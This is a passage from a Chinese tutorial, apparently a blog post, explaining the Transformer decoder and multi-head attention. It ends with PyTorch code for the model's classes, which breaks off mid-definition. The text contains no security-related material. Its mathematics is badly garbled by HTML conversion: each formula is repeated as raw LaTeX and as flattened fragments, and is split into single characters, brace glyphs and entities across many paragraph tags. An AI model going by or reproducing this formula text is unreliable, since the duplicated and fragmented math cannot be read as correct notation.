O^{\\prime\\prime\\prime}=\\mathrm{MultiHead}(Q^N,K^N,\\hat{V}^{\\prime})</p>\n<p>O&nbsp;</p>\n<p>&prime;&prime;&prime;</p>\n<p>&nbsp;=MultiHead(Q&nbsp;</p>\n<p>N</p>\n<p>&nbsp;,K&nbsp;</p>\n<p>N</p>\n<p>&nbsp;,&nbsp;</p>\n<p>V</p>\n<p>^</p>\n<p>&nbsp;&nbsp;</p>\n<p>&prime;</p>\n<p>&nbsp;)</p>\n<p>这里的交叉注意力分布综合E n c o d e r \\mathrm{Encoder}Encoder输出结果和D e c o d e r \\mathrm{Decoder}Decoder中间结果的信息。实际编程编程中将I N I^NI&nbsp;</p>\n<p>N</p>\n<p>&nbsp;直接赋值给Q ^ \\hat{Q}&nbsp;</p>\n<p>Q</p>\n<p>^</p>\n<p>​</p>\n<p>&nbsp;和K ^ \\hat{K}&nbsp;</p>\n<p>K</p>\n<p>^</p>\n<p>&nbsp;，O &prime; O^{\\prime}O&nbsp;</p>\n<p>&prime;</p>\n<p>&nbsp;直接赋值给V ^ &prime; \\hat{V}^{\\prime}&nbsp;</p>\n<p>V</p>\n<p>^</p>\n<p>&nbsp;&nbsp;</p>\n<p>&prime;</p>\n<p>&nbsp;。然后将O &prime; &prime; O^{\\prime\\prime}O&nbsp;</p>\n<p>&prime;&prime;</p>\n<p>&nbsp;与注意力分布O &prime; &prime; &prime; O^{\\prime\\prime\\prime}O&nbsp;</p>\n<p>&prime;&prime;&prime;</p>\n<p>&nbsp;进行残差计算得到输出矩阵O &prime; &prime; + O &prime; &prime; &prime; O^{\\prime\\prime}+O^{\\prime\\prime\\prime}O&nbsp;</p>\n<p>&prime;&prime;</p>\n<p>&nbsp;+O&nbsp;</p>\n<p>&prime;&prime;&prime;</p>\n<p>&nbsp;。</p>\n<p>接着对O &prime; &prime; + O &prime; &prime; &prime; O^{\\prime\\prime}+O^{\\prime\\prime\\prime}O&nbsp;</p>\n<p>&prime;&prime;</p>\n<p>&nbsp;+O&nbsp;</p>\n<p>&prime;&prime;&prime;</p>\n<p>&nbsp;进行层归一操作得到O &prime; &prime; &prime; &prime; O^{\\prime\\prime\\prime\\prime}O&nbsp;</p>\n<p>&prime;&prime;&prime;&prime;</p>\n<p>&nbsp;，再将O &prime; &prime; &prime; &prime; O^{\\prime\\prime\\prime\\prime}O&nbsp;</p>\n<p>&prime;&prime;&prime;&prime;</p>\n<p>&nbsp;输入到全连接神经网络中得到O &prime; &prime; &prime; &prime; &prime; O^{\\prime\\prime\\prime\\prime\\prime}O&nbsp;</p>\n<p>&prime;&prime;&prime;&prime;&prime;</p>\n<p>&nbsp;，接着再做一步残差操作得到O &prime; &prime; &prime; &prime; + O &prime; &prime; &prime; &prime; &prime; O^{\\prime\\prime\\prime\\prime}+O^{\\prime\\prime\\prime\\prime\\prime}O&nbsp;</p>\n<p>&prime;&prime;&prime;&prime;</p>\n<p>&nbsp;+O&nbsp;</p>\n<p>&prime;&prime;&prime;&prime;&prime;</p>\n<p>&nbsp;，最后再进行一层归一化操作。</p>\n<p>以上是一个B l o c k \\mathrm{Block}Block的操作原理，将N NN个B l o c k \\mathrm{Block}Block进行堆叠就组成了D e c o d e r \\mathrm{Decoder}Decoder的模块，得到的输出为O N &isin; R n 1 &times; l 1 &times; d O^N \\in \\mathbb{R}^{n_1 \\times l_1 \\times d}O&nbsp;</p>\n<p>N</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>n&nbsp;</p>\n<p>1</p>\n<p>​</p>\n<p>&nbsp;&times;l&nbsp;</p>\n<p>1</p>\n<p>​</p>\n<p>&nbsp;&times;d</p>\n<p>&nbsp;。然后在词汇字典中找到当前预测最大概率的单词，并将该单词词向量作为下一阶段的输入，重复以上步骤，直到输出&ldquo;e n d \\mathrm{end}end&rdquo;字符为止。</p>\n<p>&nbsp;</p>\n<p>代码示例</p>\n<p>&emsp;T r a n s f o r m e r \\mathrm{Transformer}Transformer具体的代码示例如下所示。根据上文中M u l t i \\mathrm{Multi}Multi-H e a d&nbsp; &nbsp;A t t e n t i o n \\mathrm{Head\\text{ }Attention}Head Attention原理示例图可知，严格来看M u l t i \\mathrm{Multi}Multi-H e a d&nbsp; &nbsp;A t t e n t i o n \\mathrm{Head\\text{ }Attention}Head Attention在求注意分布的时候中间其实是有两步线性变换。给定输入向量x &isin; R 256 &times; 1 x\\in \\mathbb{R}^{256\\times 1}x&isin;R&nbsp;</p>\n<p>256&times;1</p>\n<p>&nbsp; 第一步线性变换直接让向量x xx赋值给q qq，k kk，v vv，这一过程以下程序中有所体现，在这里并不会产生歧义。第二步线性变换产生多H e a d \\mathrm{Head}Head，假设H e a d = 8 \\mathrm{Head}=8Head=8的时候，按理说q qq要与8 88个矩阵W q 1 , ⋯ &thinsp; , W q 8 W^{q1},\\cdots,W^{q8}W&nbsp;</p>\n<p>q1</p>\n<p>&nbsp;,⋯,W&nbsp;</p>\n<p>q8</p>\n<p>&nbsp;进行线性变换得到8 88个q 1 , ⋯ &thinsp; , q 8 q^{1},\\cdots,q^{8}q&nbsp;</p>\n<p>1</p>\n<p>&nbsp;,⋯,q&nbsp;</p>\n<p>8</p>\n<p>&nbsp;，同理k kk要与8 88个矩阵W k 1 , ⋯ &thinsp; , W k 8 W^{k1},\\cdots,W^{k8}W&nbsp;</p>\n<p>k1</p>\n<p>&nbsp;,⋯,W&nbsp;</p>\n<p>k8</p>\n<p>&nbsp;进行线性变换得到8 88个k 1 , ⋯ &thinsp; , k 8 k^{1},\\cdots,k^{8}k&nbsp;</p>\n<p>1</p>\n<p>&nbsp;,⋯,k&nbsp;</p>\n<p>8</p>\n<p>&nbsp;，v vv要与8 88个矩阵W v 1 , ⋯ &thinsp; , W v 8 W^{v1},\\cdots,W^{v8}W&nbsp;</p>\n<p>v1</p>\n<p>&nbsp;,⋯,W&nbsp;</p>\n<p>v8</p>\n<p>&nbsp;进行线性变换得到8 88个v 1 , ⋯ &thinsp; , v 8 v^{1},\\cdots,v^{8}v&nbsp;</p>\n<p>1</p>\n<p>&nbsp;,⋯,v&nbsp;</p>\n<p>8</p>\n<p>&nbsp;，如果按照这个方式在程序实现则需要定义24个权重矩阵，非常的麻烦。以下程序中有一个简单的权重定义方法，通过该方法也可以实现以上多H e a d \\mathrm{Head}Head的线性变换，以向量q = ( q 1 , ⋯ &thinsp; , q 256 ) ⊤ &isin; R 256 &times; 1 q = (q_1,\\cdots, q_{256})^{\\top}\\in \\mathbb{R}^{256 \\times 1}q=(q&nbsp;</p>\n<p>1</p>\n<p>​</p>\n<p>&nbsp;,⋯,q&nbsp;</p>\n<p>256</p>\n<p>​</p>\n<p>&nbsp;)&nbsp;</p>\n<p>⊤</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>256&times;1</p>\n<p>&nbsp;为例：</p>\n<p>&nbsp;</p>\n<p>首先将向量q qq进行截断分成H e a d = 8 \\mathrm{Head}=8Head=8个向量，即为</p>\n<p>{ q ( 1 ) = ( E , 0 , 0 , 0 , 0 , 0 , 0 , 0 ) &sdot; q q ( 2 ) = ( 0 , E , 0 , 0 , 0 , 0 , 0 , 0 ) &sdot; q q ( 3 ) = ( 0 , 0 , E , 0 , 0 , 0 , 0 , 0 ) &sdot; q q ( 4 ) = ( 0 , 0 , 0 , E , 0 , 0 , 0 , 0 ) &sdot; q q ( 5 ) = ( 0 , 0 , 0 , 0 , E , 0 , 0 , 0 ) &sdot; q q ( 6 ) = ( 0 , 0 , 0 , 0 , 0 , E , 0 , 0 ) &sdot; q q ( 7 ) = ( 0 , 0 , 0 , 0 , 0 , 0 , E , 0 ) &sdot; q q ( 8 ) = ( 0 , 0 , 0 , 0 , 0 , 0 , 0 , E ) &sdot; q \\left\\{</p>\n<p>q(1)q(2)q(3)q(4)q(5)q(6)q(7)q(8)=(E,0,0,0,0,0,0,0)&sdot;q=(0,E,0,0,0,0,0,0)&sdot;q=(0,0,E,0,0,0,0,0)&sdot;q=(0,0,0,E,0,0,0,0)&sdot;q=(0,0,0,0,E,0,0,0)&sdot;q=(0,0,0,0,0,E,0,0)&sdot;q=(0,0,0,0,0,0,E,0)&sdot;q=(0,0,0,0,0,0,0,E)&sdot;q</p>\n<p>q(1)=(E,0,0,0,0,0,0,0)&sdot;qq(2)=(0,E,0,0,0,0,0,0)&sdot;qq(3)=(0,0,E,0,0,0,0,0)&sdot;qq(4)=(0,0,0,E,0,0,0,0)&sdot;qq(5)=(0,0,0,0,E,0,0,0)&sdot;qq(6)=(0,0,0,0,0,E,0,0)&sdot;qq(7)=(0,0,0,0,0,0,E,0)&sdot;qq(8)=(0,0,0,0,0,0,0,E)&sdot;q</p>\n<p>\\right.</p>\n<p>⎩</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎨</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎧</p>\n<p>​</p>\n<p>&nbsp;&nbsp;</p>\n<p>q&nbsp;</p>\n<p>(1)</p>\n<p>&nbsp;</p>\n<p>q&nbsp;</p>\n<p>(2)</p>\n<p>&nbsp;</p>\n<p>q&nbsp;</p>\n<p>(3)</p>\n<p>&nbsp;</p>\n<p>q&nbsp;</p>\n<p>(4)</p>\n<p>&nbsp;</p>\n<p>q&nbsp;</p>\n<p>(5)</p>\n<p>&nbsp;</p>\n<p>q&nbsp;</p>\n<p>(6)</p>\n<p>&nbsp;</p>\n<p>q&nbsp;</p>\n<p>(7)</p>\n<p>&nbsp;</p>\n<p>q&nbsp;</p>\n<p>(8)</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;&nbsp;</p>\n<p>=(E,0,0,0,0,0,0,0)&sdot;q</p>\n<p>=(0,E,0,0,0,0,0,0)&sdot;q</p>\n<p>=(0,0,E,0,0,0,0,0)&sdot;q</p>\n<p>=(0,0,0,E,0,0,0,0)&sdot;q</p>\n<p>=(0,0,0,0,E,0,0,0)&sdot;q</p>\n<p>=(0,0,0,0,0,E,0,0)&sdot;q</p>\n<p>=(0,0,0,0,0,0,E,0)&sdot;q</p>\n<p>=(0,0,0,0,0,0,0,E)&sdot;q</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>其中q ( i ) &isin; R 32 &times; 1 q^{(i)}\\in \\mathbb{R}^{32\\times 1}q&nbsp;</p>\n<p>(i)</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>32&times;1</p>\n<p>&nbsp;是q qq的第i ii个截断向量，E &isin; R 32 &times; 32 {\\bf{E}}\\in \\mathbb{R}^{32 \\times 32}E&isin;R&nbsp;</p>\n<p>32&times;32</p>\n<p>&nbsp;是单位矩阵，0 &isin; R 32 &times; 32 {\\bf{0}}\\in \\mathbb{R}^{32 \\times 32}0&isin;R&nbsp;</p>\n<p>32&times;32</p>\n<p>&nbsp;是零矩阵。</p>\n<p>然后对q ( i ) , i &isin; { 1 , ⋯ &thinsp; , 8 } q^{(i)},i\\in \\{1,\\cdots,8\\}q&nbsp;</p>\n<p>(i)</p>\n<p>&nbsp;,i&isin;{1,⋯,8}用相同的权重矩阵W &isin; R 32 &times; 32 W \\in \\mathbb{R}^{32 \\times 32}W&isin;R&nbsp;</p>\n<p>32&times;32</p>\n<p>&nbsp;进行线性变换，此时可以发现，训练过程的时候只需要更新权重矩阵W WW即可，而且可以进行多H e a d \\mathrm{Head}Head线性变换，8 88个权重矩阵可以表示为：</p>\n<p>{ W q 1 = W &sdot; ( E , 0 , 0 , 0 , 0 , 0 , 0 , 0 ) = ( W , 0 , 0 , 0 , 0 , 0 , 0 , 0 ) W q 2 = W &sdot; ( 0 , E , 0 , 0 , 0 , 0 , 0 , 0 ) = ( 0 , W , 0 , 0 , 0 , 0 , 0 , 0 ) W q 3 = W &sdot; ( 0 , 0 , E , 0 , 0 , 0 , 0 , 0 ) = ( 0 , 0 , W , 0 , 0 , 0 , 0 , 0 ) W q 4 = W &sdot; ( 0 , 0 , 0 , E , 0 , 0 , 0 , 0 ) = ( 0 , 0 , 0 , W , 0 , 0 , 0 , 0 ) W q 5 = W &sdot; ( 0 , 0 , 0 , 0 , E , 0 , 0 , 0 ) = ( 0 , 0 , 0 , 0 , W , 0 , 0 , 0 ) W q 6 = W &sdot; ( 0 , 0 , 0 , 0 , 0 , E , 0 , 0 ) = ( 0 , 0 , 0 , 0 , 0 , W , 0 , 0 ) W q 7 = W &sdot; ( 0 , 0 , 0 , 0 , 0 , 0 , E , 0 ) = ( 0 , 0 , 0 , 0 , 0 , 0 , W , 0 ) W q 8 = W &sdot; ( 0 , 0 , 0 , 0 , 0 , 0 , 0 , E ) = ( 0 , 0 , 0 , 0 , 0 , 0 , 0 , W ) \\left\\{</p>\n<p>Wq1Wq2Wq3Wq4Wq5Wq6Wq7Wq8=W&sdot;(E,0,0,0,0,0,0,0)=(W,0,0,0,0,0,0,0)=W&sdot;(0,E,0,0,0,0,0,0)=(0,W,0,0,0,0,0,0)=W&sdot;(0,0,E,0,0,0,0,0)=(0,0,W,0,0,0,0,0)=W&sdot;(0,0,0,E,0,0,0,0)=(0,0,0,W,0,0,0,0)=W&sdot;(0,0,0,0,E,0,0,0)=(0,0,0,0,W,0,0,0)=W&sdot;(0,0,0,0,0,E,0,0)=(0,0,0,0,0,W,0,0)=W&sdot;(0,0,0,0,0,0,E,0)=(0,0,0,0,0,0,W,0)=W&sdot;(0,0,0,0,0,0,0,E)=(0,0,0,0,0,0,0,W)</p>\n<p>Wq1=W&sdot;(E,0,0,0,0,0,0,0)=(W,0,0,0,0,0,0,0)Wq2=W&sdot;(0,E,0,0,0,0,0,0)=(0,W,0,0,0,0,0,0)Wq3=W&sdot;(0,0,E,0,0,0,0,0)=(0,0,W,0,0,0,0,0)Wq4=W&sdot;(0,0,0,E,0,0,0,0)=(0,0,0,W,0,0,0,0)Wq5=W&sdot;(0,0,0,0,E,0,0,0)=(0,0,0,0,W,0,0,0)Wq6=W&sdot;(0,0,0,0,0,E,0,0)=(0,0,0,0,0,W,0,0)Wq7=W&sdot;(0,0,0,0,0,0,E,0)=(0,0,0,0,0,0,W,0)Wq8=W&sdot;(0,0,0,0,0,0,0,E)=(0,0,0,0,0,0,0,W)</p>\n<p>\\right.</p>\n<p>⎩</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎨</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎧</p>\n<p>​</p>\n<p>&nbsp;&nbsp;</p>\n<p>W&nbsp;</p>\n<p>q1</p>\n<p>&nbsp;</p>\n<p>W&nbsp;</p>\n<p>q2</p>\n<p>&nbsp;</p>\n<p>W&nbsp;</p>\n<p>q3</p>\n<p>&nbsp;</p>\n<p>W&nbsp;</p>\n<p>q4</p>\n<p>&nbsp;</p>\n<p>W&nbsp;</p>\n<p>q5</p>\n<p>&nbsp;</p>\n<p>W&nbsp;</p>\n<p>q6</p>\n<p>&nbsp;</p>\n<p>W&nbsp;</p>\n<p>q7</p>\n<p>&nbsp;</p>\n<p>W&nbsp;</p>\n<p>q8</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;&nbsp;</p>\n<p>=W&sdot;(E,0,0,0,0,0,0,0)=(W,0,0,0,0,0,0,0)</p>\n<p>=W&sdot;(0,E,0,0,0,0,0,0)=(0,W,0,0,0,0,0,0)</p>\n<p>=W&sdot;(0,0,E,0,0,0,0,0)=(0,0,W,0,0,0,0,0)</p>\n<p>=W&sdot;(0,0,0,E,0,0,0,0)=(0,0,0,W,0,0,0,0)</p>\n<p>=W&sdot;(0,0,0,0,E,0,0,0)=(0,0,0,0,W,0,0,0)</p>\n<p>=W&sdot;(0,0,0,0,0,E,0,0)=(0,0,0,0,0,W,0,0)</p>\n<p>=W&sdot;(0,0,0,0,0,0,E,0)=(0,0,0,0,0,0,W,0)</p>\n<p>=W&sdot;(0,0,0,0,0,0,0,E)=(0,0,0,0,0,0,0,W)</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>其中权重矩阵W q i &isin; R 32 &times; 256 , i &isin; { 1 , ⋯ &thinsp; , 8 } W^{qi}\\in\\mathbb{R}^{32 \\times 256},i\\in\\{1,\\cdots,8\\}W&nbsp;</p>\n<p>qi</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>32&times;256</p>\n<p>&nbsp;,i&isin;{1,⋯,8}。</p>\n<p>import torch</p>\n<p>import torch.nn as nn</p>\n<p>import os</p>\n<p>&nbsp;</p>\n<p>class SelfAttention(nn.Module):</p>\n<p><span style=\"white-space: pre;\"> </span>def __init__(self, embed_size, heads):</p>\n<p><span style=\"white-space: pre;\"> </span>super(SelfAttention, self).__init__()</p>\n<p><span style=\"white-space: pre;\"> </span>self.embed_size = embed_size</p>\n<p><span style=\"white-space: pre;\"> </span>self.heads = heads</p>\n<p><span style=\"white-space: pre;\"> </span>self.head_dim = embed_size // heads</p>\n<p>&nbsp;</p>\n<p><span style=\"white-space: pre;\"> </span>assert (self.head_dim * heads == embed_size), \"Embed size needs to be div by heads\"</p>\n<p>&nbsp;</p>\n<p><span style=\"white-space: pre;\"> </span>self.values = nn.Linear(self.head_dim, self.head_dim, bias=False)</p>\n<p><span style=\"white-space: pre;\"> </span>self.keys = nn.Linear(self.head_dim, self.head_dim, bias=False)</p>\n<p><span style=\"white-space: pre;\"> </span>self.queries = nn.Linear(self.head_dim, self.head_dim, bias=False)</p>\n<p><span style=\"white-space: pre;\"> </span>self.fc_out = nn.Linear(heads * self.head_dim, embed_size)</p>\n<p>&nbsp;</p>\n<p><span style=\"white-space: pre;\"> </span>def forward(self, values, keys, query, mask):</p>\n<p><span style=\"white-space: pre;\"> </span>N =query.shape[0]</p>\n<p><span style=\"white-space: pre;\"> </span>value_len , key_len , query_len = values.shape[1], keys.shape[1], query.shape[1]</p>\n<p>&nbsp;</p>\n<p><span style=\"white-space: pre;\"> </span># split embedding into self.heads pieces</p>\n<p><span style=\"white-space: pre;\"> </span>values = values.reshape(N, value_len, self.heads, self.head_dim)</p>\n<p><span style=\"white-space: pre;\"> </span>keys = keys.reshape(N, key_len, self.heads, self.head_dim)</p>\n<p><span style=\"white-space: pre;\"> </span>queries = query.reshape(N, query_len, self.heads, self.head_dim)</p>\n<p><span style=\"white-space: pre;\"> </span></p>\n<p><span style=\"white-space: pre;\"> </span>values = self.values(values)</p>\n<p><span style=\"white-space: pre;\"> </span>keys = self.keys(keys)</p>\n<p><span style=\"white-space: pre;\"> </span>queries = self.queries(queries)</p>\n<p>&nbsp;</p>\n<p><span style=\"white-space: pre;\"> </span>energy = torch.einsum(\"nqhd,nkhd-&gt;nhqk\", queries, keys)</p>\n<p><span style=\"white-space: pre;\"> </span># queries shape: (N, query_len, heads, heads_dim)</p>\n<p><span style=\"white-space: pre;\"> </span># keys shape : (N, key_len, heads, heads_dim)</p>\n<p><span style=\"white-space: pre;\"> </span># energy shape: (N, heads, query_len, key_len)</p>\n<p>&nbsp;</p>\n<p><span style=\"white-space: pre;\"> </span>if mask is not None:</p>\n<p><span style=\"white-space: pre;\"> </span>energy = energy.masked_fill(mask == 0, float(\"-1e20\"))</p>\n<p>&nbsp;</p>\n<p><span style=\"white-space: pre;\"> </span>attention = torch.softmax(energy/ (self.embed_size ** (1/2)), dim=3)</p>\n<p>&nbsp;</p>\n<p><span style=\"white-space: pre;\"> </span>out = torch.einsum(\"nhql, nlhd-&gt;nqhd\", [attention, values]).reshape(N, query_len, self.heads*self.head_dim)</p>\n<p><span style=\"white-space: pre;\"> </span># attention shape: (N, heads, query_len, key_len)</p>\n<p><span style=\"white-space: pre;\"> </span># values shape: (N, value_len, heads, heads_dim)</p>\n<p><span style=\"white-space: pre;\"> </span># (N, query_len, heads, head_dim)</p>\n<p>&nbsp;</p>\n<p><span style=\"white-space: pre;\"> </span>out = self.fc_out(out)</p>\n<p><span style=\"white-space: pre;\"> </span>return out</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>class TransformerBlock(nn.Module):</p>\n<p><span style=\"white-space: pre;\"> </span>def __init__(self, embed_size, heads, dropout, forward_expansion):</p>\n<p><span style=\"white-space: pre;\"> </span>super(TransformerBlock, self).__init__()</p>\n<p><span style=\"white-space: pre;\"> </span>self.attention = SelfAttention(embed_size, heads)</p>\n<p><span style=\"white-space: pre;\"> </span>self.norm1 = nn.LayerNorm(embed_size)</p>\n<p><span style=\"white-space: pre;\"> </span>self.norm2 = nn.LayerNorm(embed_size)</p>\n<p>&nbsp;</p>\n<p><span style=\"white-space: pre;\"> </span>self.feed_forward = nn.Sequential(</p>\n<p><span style=\"white-space: pre;\"> </span>nn.Linear(embed_size, forward_expansion*embed_size),</p>\n<p><span style=\"white-space: pre;\"> </span>nn.ReLU(),</p>\n<p><span style=\"white-space: pre;\"> </span>nn.Linear(forward_expansion*embed_size, embed_size)</p>\n<p><span style=\"white-space: pre;\"> </span>)</p>\n<p><span style=\"white-space: pre;\"> </span>self.dropout = nn.Dropout(dropout)</p>\n<p>&nbsp;</p>\n<p><span style=\"white-space: pre;\"> </span>def forward(self, value, key, query, mask):</p>\n<p><span style=\"white-space: pre;\"> </span>attention = self.attention(value, key, query, mask)</p>\n<p>&nbsp;</p>\n<p><span style=\"white-space: pre;\"> </span>x = self.dropout(self.norm1(attention + query))</p>\n<p><span style=\"white-space: pre;\"> </span>forward = self.feed_forward(x)</p>\n<p><span style=\"white-space: pre;\"> </span>out = self.dropout(self.norm2(forward + x))</p>\n<p><span style=\"white-space: pre;\"> </span>return out</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>class Encoder(nn.Module):</p>\n<p><span style=\"white-space: pre;\"> </span>def __init__(</p>\n<p><span style=\"white-space: pre;\"> </span>self,</p>\n<p><span style=\"white-space: pre;\"> </span>src_vocab_size,</p>\n<p><span style=\"white-space: pre;\"> </span>embed_size,</p>\n<p><span style=\"white-space: pre;\"> </span>num_layers,</p>\n<p><span style=\"white-space: pre;\"> </span>heads,</p>\n<p><span style=\"white-space: pre;\"> </span>device,</p>\n<p><span style=\"white-space: pre;\"> </span>forward_expansion,</p>\n<p><span style=\"white-space: pre;\"> </span>dropout,</p>\n<p><span style=\"white-space: pre;\"> </span>max_length,</p>\n<p><span style=\"white-space: pre;\"> </span>):</p>\n<p><span style=\"white-space: pre;\"> </span>super(Encoder, self).__init__()</p>\n<p><span style=\"white-space: pre;\"> </span>self.embed_size = embed_size</p>\n<p><span style=\"white-space: pre;\"> </span>self.device = device</p>\n<p><span style=\"white-space: pre;\"> </span>self.word_embedding = nn.Embedding(src_vocab_size, embed_size)</p>\n<p><span style=\"white-space: pre;\"> </span>self.position_embedding = nn.Embedding(max_length, embed_size)</p>\n<p>&nbsp;</p>\n<p><span style=\"white-space: pre;\"> </span>self.layers = nn.ModuleList(</p>\n<p><span style=\"white-space: pre;\"> </span>[</p>\n<p><span style=\"white-space: pre;\"> </span>TransformerBlock(</p>\n<p><span style=\"white-space: pre;\"> </span>embed_size,</p>\n<p><span style=\"white-space: pre;\"> </span>heads,</p>\n<p><span style=\"white-space: pre;\"> </span>dropout=dropout,</p>\n<p><span style=\"white-space: pre;\"> </span>forward_expansion=forward_expansion,</p>\n<p><span style=\"white-space: pre;\"> </span>)</p>\n<p><span style=\"white-space: pre;\"> </span>for _ in range(num_layers)]</p>\n<p><span style=\"white-space: pre;\"> </span>)</p>\n<p><span style=\"white-space: pre;\"> </span>self.dropout = nn.Dropout(dropout)</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p><span style=\"white-space: pre;\"> </span>def forward(self, x, mask):</p>\n<p><span style=\"white-space: pre;\"> </span>N, seq_length = x.shape</p>\n<p><span style=\"white-space: pre;\"> </span>positions = torch.arange(0, seq_length).expand(N, seq_length).to(self.device)</p>\n<p><span style=\"white-space: pre;\"> </span>out = self.dropout(self.word_embedding(x) + self.position_embedding(positions))</p>\n<p><span style=\"white-space: pre;\"> </span>for layer in self.layers:</p>\n<p><span style=\"white-space: pre;\"> </span>out = layer(out, out, out, mask)</p>\n<p>&nbsp;</p>\n<p><span style=\"white-space: pre;\"> </span>return out</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>class DecoderBlock(nn.Module):</p>\n<p><span style=\"white-space: pre;\"> </span>def __init__(self, embed_size, heads, forward_expansion, dropout, device):</p>\n<p><span style=\"white-space: pre;\"> </span>super(DecoderBlock, self).__init__()</p>\n<p><span style=\"white-space: pre;\"> </span>self.attention = SelfAttention(embed_size, heads)</p>\n<p><span style=\"white-space: pre;\"> </span>self.norm = nn.LayerNorm(embed_size)</p>\n<p><span style=\"white-space: pre;\"> </span>self.transformer_block = TransformerBlock(</p>\n<p><span style=\"white-space: pre;\"> </span>embed_size, heads, dropout, forward_expansion</p>\n<p><span style=\"white-space: pre;\"> </span>)</p>\n<p>&nbsp;</p>\n<p><span style=\"white-space: pre;\"> </span>self.dropout = nn.Dropout(dropout)</p>\n<p>&nbsp;</p>\n<p><span style=\"white-space: pre;\"> </span>def forward(self, x, value, key, src_mask, trg_mask):</p>\n<p><span style=\"white-space: pre;\"> </span>attention = self.attention(x, x, x, trg_mask)</p>\n<p><span style=\"white-space: pre;\"> </span>query = self.dropout(self.norm(attention + x))</p>\n<p><span style=\"white-space: pre;\"> </span>out = self.transformer_block(value, key, query, src_mask)</p>\n<p><span style=\"white-space: pre;\"> </span>return out</p>\n<p>&nbsp;</p>\n<p>class Decoder(nn.Module):</p>\n<p><span style=\"white-space: pre;\"> </span>def __init__(</p>\n<p><span style=\"white-space: pre;\"> </span>self,</p>\n<p><span style=\"white-space: pre;\"> </span>trg_vocab_size,</p>\n<p><span style=\"white-space: pre;\"> </span>embed_size,</p>\n<p><span style=\"white-space: pre;\"> </span>num_layers,</p>\n<p><span style=\"white-space: pre;\"> </span>heads,</p>\n<p><span style=\"white-space: pre;\"> </span>forward_expansion,</p>\n<p><span style=\"white-space: pre;\"> </span>dropout,</p>\n<p><span style=\"white-space: pre;\"> </span>device,</p>\n<p><span style=\"white-space: pre;\"> </span>max_length,</p>\n<p><span style=\"white-space: pre;\"> </span>):</p>\n<p><span style=\"white-space: pre;\"> </span>super(Decoder, self).__init__()</p>\n<p><span style=\"white-space: pre;\"> </span>self.device = device</p>\n<p><span style=\"white-space: pre;\"> </span>self.word_embedding = nn.Embedding(trg_vocab_size, embed_size)</p>\n<p><span style=\"white-space: pre;\"> </span>self.position_embedding = nn.Embedding(max_length, embed_size)</p>\n<p><span style=\"white-space: pre;\"> </span>self.layers = nn.ModuleList(</p>\n<p><span style=\"white-space: pre;\"> </span>[DecoderBlock(embed_size, heads, forward_expansion, dropout, device)</p>\n<p><span style=\"white-space: pre;\"> </span>for _ in range(num_layers)]</p>\n<p><span style=\"white-space: pre;\"> </span>)</p>\n<p><span style=\"white-space: pre;\"> </span>self.fc_out = nn.Linear(embed_size, trg_vocab_size)</p>\n<p><span style=\"white-space: pre;\"> </span>self.dropout = nn.Dropout(dropout)</p>\n<p>&nbsp;</p>\n<p><span style=\"white-space: pre;\"> </span>def forward(self, x ,enc_out , src_mask, trg_mask):</p>\n<p><span style=\"white-space: pre;\"> </span>N, seq_length = x.shape</p>\n<p><span style=\"white-space: pre;\"> </span>positions = torch.arange(0, seq_length).expand(N, seq_length).to(self.device)</p>\n<p><span style=\"white-space: pre;\"> </span>x = self.dropout((self.word_embedding(x) + self.position_embedding(positions)))</p>\n<p>&nbsp;</p>\n<p><span style=\"white-space: pre;\"> </span>for layer in self.layers:</p>\n<p><span style=\"white-space: pre;\"> </span>x = layer(x, enc_out, enc_out, src_mask, trg_mask)</p>\n<p>&nbsp;</p>\n<p><span style=\"white-space: pre;\"> </span>out =self.fc_out(x)</p>\n<p><span style=\"white-space: pre;\"> </span>return out</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>class Transformer(nn.Module):</p>\n<p><span style=\"white-space: pre;\"> </span>def __init__(</p>\n<p><span style=\"white-space: pre;\"> </span>self,</p>\n<p><span style=\"white-space: pre;\"> </span>src_vocab_size,</p>\n<p><span style=\"white-space: pre;\"> </span>trg_vocab_size,</p>\n<p><span style=\"white-space: pre;\"> </span>src_pad_idx,</p>\n<p><span style=\"white-space: pre;\"> </span>trg_pad_idx,</p>\n<p><span style=\"white-space: pre;\"> </span>embed_size = 256,</p>\n<p><span style=\"white-space: pre;\"> </span>num_layers = 6,</p>\n<p><span style=\"white-space: pre;\"> </span>forward_expansion = 4,</p>\n<p><span style=\"white-space: pre;\"> </span>heads = 8,</p>\n<p><span style=\"white-space: pre;\"> </span>dropout = 0,</p>\n<p><span style=\"white-space: pre;\"> </span>device=\"cuda\",</p>\n<p><span style=\"white-space: pre;\"> </span>max_length=100</p>\n<p><span style=\"white-space: 